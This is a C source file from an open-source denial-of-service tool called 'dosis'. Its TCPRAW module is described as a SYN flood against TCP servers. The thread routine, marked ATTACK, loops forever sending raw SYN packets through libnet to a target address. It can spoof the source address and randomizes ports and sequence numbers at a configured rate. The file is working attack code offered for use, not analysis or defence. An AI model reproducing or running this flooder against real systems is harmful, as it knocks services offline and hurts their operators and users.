/*****************************************************************************
 * tcpraw.c
 *
 * DoS on TCP servers by raw tcp packets (synflood?).
 *
 * ---------------------------------------------------------------------------
 * dosis - DoS: Internet Sodomizer
 *   (C) 2008-2009 Gerardo García Peña <gerardo@kung-foo.net>
 *
 *   This program is free software; you can redistribute it and/or modify it
 *   under the terms of the GNU General Public License as published by the Free
 *   Software Foundation; either version 2 of the License, or (at your option)
 *   any later version.
 *
 *   This program is distributed in the hope that it will be useful, but WITHOUT
 *   ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 *   FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for
 *   more details.
 *
 *   You should have received a copy of the GNU General Public License along
 *   with this program; if not, write to the Free Software Foundation, Inc., 51
 *   Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 *****************************************************************************/

#include <config.h>

#include "dosconfig.h"
#include "dosis.h"
#include "ip.h"
#include "lnet.h"
#include "log.h"
#include "payload.h"
#include "pthreadex.h"
#include "tcpraw.h"
#include "tea.h"

typedef struct _tag_TCPRAW_CFG {
  /* options */
  TEA_TYPE_ADDR      shost;
  TEA_TYPE_ADDR      dhost;
  TEA_TYPE_STRING    sflags;
  TEA_TYPE_INT       pattern;
  TEA_TYPE_INT       npackets;
  TEA_TYPE_FLOAT     hitratio;
  TEA_TYPE_DATA      payload;

  /* other things */
  int                flags;
  pthreadex_timer_t  timer;
  LN_CONTEXT        *lnc;
} TCPRAW_CFG;

/*****************************************************************************
 * THREAD IMPLEMENTATION
 *****************************************************************************/

static int tcpraw__listen_check(THREAD_WORK *tw, char *msg, unsigned int size)
{
  TCPRAW_CFG *tc = (TCPRAW_CFG *) tw->data;

  /* check msg size and headers */
  if(size < sizeof(struct iphdr)
  || IP_PROTOCOL(msg) != 6
  || size < sizeof(struct tcphdr) + (IP_HEADER(msg)->ihl << 2))
    return 0;

  /* check msg */
  return IP_HEADER(msg)->saddr == tc->dhost.addr.in.addr
      && ntohs(TCP_HEADER(msg)->source) == tc->dhost.port
         ? -255 : 0;
}

static void tcpraw__thread(THREAD_WORK *tw)
{
  TCPRAW_CFG *tc = (TCPRAW_CFG *) tw->data;
  unsigned int seq = libnet_get_prand(LIBNET_PRu32);
  unsigned sport, dport;
  int i;

  sport = dport = 1337;

  /* ATTACK */
  while(1)
  {
    /* wait for work */
    if(tc->hitratio > 0)
      if(pthreadex_timer_wait(&(tc->timer)) < 0)
        TERR("Error at pthreadex_timer_wait(): %s", strerror(errno));

    /* build TCP packet with payload (if requested) */
    TDBG2("Sending %d packet(s)...", tc->npackets);
    for(i = 0; i < tc->npackets; i++)
    {
      sport = tc->shost.port_defined
                ? tc->shost.port
                : NEXT_RAND_PORT(sport);
      dport = tc->dhost.port_defined
                ? tc->dhost.port
                : NEXT_RAND_PORT(dport);
      seq += libnet_get_prand(LIBNET_PRu16) & 0x00ff;
/* XXX TODO: "Set flags" */
/* XXX TODO: "Set window" */
      ln_send_tcp_packet(tc->lnc,
                         &tc->shost.addr.in.inaddr, sport,
                         &tc->dhost.addr.in.inaddr, dport,
                         TH_SYN, 13337,
                         seq, 0,
                         (char *) tc->payload.data, tc->payload.size,
                         NULL, 0);
    }
  }
}

/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 * CONFIGURATION. 
 *   Is important to consider that this function could be
 *   called several times during thread live: initial
 *   configuration and reconfigurations.
 *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/

static int tcpraw__configure(THREAD_WORK *tw, SNODE *command, int first_time)
{
  TCPRAW_CFG *tc = (TCPRAW_CFG *) tw->data;

  /* first initialization (specialized work thread data) */
  if(first_time)
  {
    /* initialize libnet */
    TDBG("Initializing libnet.");
    if((tc->lnc = calloc(1, sizeof(LN_CONTEXT))) == NULL)
    {
      TERR("No memory for LN_CONTEXT.");
      return -1;
    }
    ln_init_context(tc->lnc);

    pthreadex_timer_init(&(tc->timer), 0.0);
    pthreadex_timer_name(&(tc->timer), "tcpraw-timer");
  }

  /* configure src address (if not defined) */
  if(tc->dhost.type == INET_FAMILY_NONE)
  {
    TERR("I need a target address.");
    return -1;
  }
  if(tc->shost.type == INET_FAMILY_NONE)
  {
    DOS_ADDR_INFO *ai;
    if((ai = dos_get_interface(&tc->dhost)) == NULL)
    {
      char buff[255];
      ip_addr_snprintf(&tc->shost, sizeof(buff), buff);
      TWRN("Cannot find a suitable source address for '%s'.", buff);
    } else
      ip_addr_copy(&tc->shost, &ai->addr);
  }

  /* check params sanity */
  if(tc->pattern != TYPE_PERIODIC)
  {
    TERR("Uknown pattern %d.", tc->pattern);
    return -1;
  }
  if(tc->npackets < 0)
    TWRN("Bad number of packets %d.", tc->npackets);
  if(tc->hitratio < 0)
  {
    TERR("Bad hit ratio '%f'.", tc->hitratio);
    return -1;
  }

  /* configure timer */
  if(tc->hitratio > 0)
    pthreadex_timer_set_frequency(&(tc->timer), tc->hitratio);

  /* (debug) print configuration */
  {
    char buff[255];

    TDBG2("config.periodic.npackets = %d", tc->npackets);
    TDBG2("config.periodic.ratio    = %f", tc->hitratio);

    ip_addr_snprintf(&tc->shost, sizeof(buff)-1, buff);
    TDBG2("config.options.shost     = %s", buff);
    ip_addr_snprintf(&tc->dhost, sizeof(buff)-1, buff);
    TDBG2("config.options.dhost     = %s", buff);
    TDBG2("config.options.flags     = %x (%s)", tc->flags, tc->sflags);
  }

  return 0;
}

static void tcpraw__cleanup(THREAD_WORK *tw)
{
  TCPRAW_CFG *tc = (TCPRAW_CFG *) tw->data;

  /* collect libnet data */
  ln_destroy_context(tc->lnc);
  free(tc->lnc);
  pthreadex_timer_destroy(&tc->timer);

  if(tc->payload.data)
  {
    free(tc->payload.data);
    tc->payload.data = NULL;
  }
}

/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 * TCPRAW TEA OBJECT
 *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/

static int cfg_cb_update_flags(TEA_OBJCFG *oc, THREAD_WORK *tw)
{
  TCPRAW_CFG *tc = (TCPRAW_CFG *) tw->data;
  int i;

  /* precalculate flags */
  tc->flags = 0;
  for(i = 0; tc->sflags[i]; i++)
    switch(toupper(tc->sflags[i]))
    {
      case 'U': tc->flags |= 0x20; break; /* urgent */
      case 'A': tc->flags |= 0x10; break; /* ack    */
      case 'P': tc->flags |= 0x08; break; /* push   */
      case 'R': tc->flags |= 0x04; break; /* reset  */
      case 'S': tc->flags |= 0x02; break; /* syn    */
      case 'F': tc->flags |= 0x01; break; /* fin    */
      default:
        ERR("Unknown TCP flag '%c'.", tc->sflags[i]);
        return -1;
    }

  return 0;
}

TOC_BEGIN(tcpraw_cfg_def)
  TOC("dst_addr",       TEA_TYPE_ADDR,   1, TCPRAW_CFG, dhost,      NULL)
  TOC("dst_port",       TEA_TYPE_PORT,   0, TCPRAW_CFG, dhost,      NULL)
  TOC("tcp_flags",      TEA_TYPE_STRING, 1, TCPRAW_CFG, flags,      cfg_cb_update_flags)
  TOC("pattern",        TEA_TYPE_INT,    1, TCPRAW_CFG, pattern,    NULL)
  TOC("payload",        TEA_TYPE_DATA,   0, TCPRAW_CFG, payload,    NULL)
  TOC("periodic_ratio", TEA_TYPE_FLOAT,  1, TCPRAW_CFG, hitratio,   NULL)
  TOC("periodic_n",     TEA_TYPE_INT,    1, TCPRAW_CFG, npackets,   NULL)
  TOC("src_addr",       TEA_TYPE_ADDR,   0, TCPRAW_CFG, shost,      NULL)
  TOC("src_port",       TEA_TYPE_PORT,   0, TCPRAW_CFG, shost,      NULL)
TOC_END

TEA_OBJECT teaTCPRAW = {
  .name         = "TCPRAW",
  .datasize     = sizeof(TCPRAW_CFG),
  .configure    = tcpraw__configure,
  .cleanup      = tcpraw__cleanup,
  .listen_check = tcpraw__listen_check,
  .thread       = tcpraw__thread,
  .cparams      = tcpraw_cfg_def
};

